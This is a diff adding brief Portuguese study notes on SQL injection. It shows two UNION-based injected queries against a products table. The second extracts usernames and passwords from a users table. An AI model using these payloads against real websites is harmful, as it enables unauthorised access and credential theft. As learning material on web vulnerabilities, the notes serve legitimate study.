@@ -1,0 +1,12 @@
+#SQL Injection
+
+Fazendo essa injeção de sql é possivel fazer um select novo através da URL do browser
+SELECT *
+FROM products
+WHERE category='Gifts' UNION SELECT 'abc', 'abc' --'; 
+
+
+
+SELECT *
+FROM products
+WHERE category='Gifts' UNION SELECT username, password FROM users --';
